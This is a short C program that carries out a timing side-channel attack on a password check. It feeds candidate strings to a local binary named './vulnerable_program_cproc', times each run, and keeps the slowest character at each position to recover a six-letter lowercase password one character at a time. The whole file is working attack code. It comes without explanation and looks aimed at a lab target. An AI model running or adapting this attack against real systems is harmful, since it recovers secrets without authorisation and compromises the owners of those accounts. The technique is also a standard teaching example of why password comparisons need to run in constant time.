#include <stdio.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define LEN 6

double measure_time(const char *password) {
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);

    FILE *fp = popen("./vulnerable_program_cproc", "w");
    if (fp == NULL) {
        perror("popen");
        return -1;
    }

    fprintf(fp, "%s\n", password);
    fflush(fp);

    if (pclose(fp) == -1) {
        perror("pclose");
        return -1;
    }
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    double elapsed = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
    return elapsed;
}

int main() {
    char guessed_password[LEN+1] = {0};
    char candidate[LEN+1] = {0};
    double max_time = 0;
    int pos = 0;

    for (pos = 0; pos < LEN; pos++) {
        for (char c = 'a'; c <= 'z'; c++) {
            candidate[pos] = c;
            double elapsed_time = measure_time(candidate);
            if (elapsed_time > max_time) {
                max_time = elapsed_time;
                guessed_password[pos] = c;
            }
        }
        printf("Guessed so far: %s\n", guessed_password);
        fflush(stdout);
        candidate[pos] = guessed_password[pos];
        max_time = 0;
    }

    printf("Guessed password: %s\n", guessed_password);
    return 0;
}
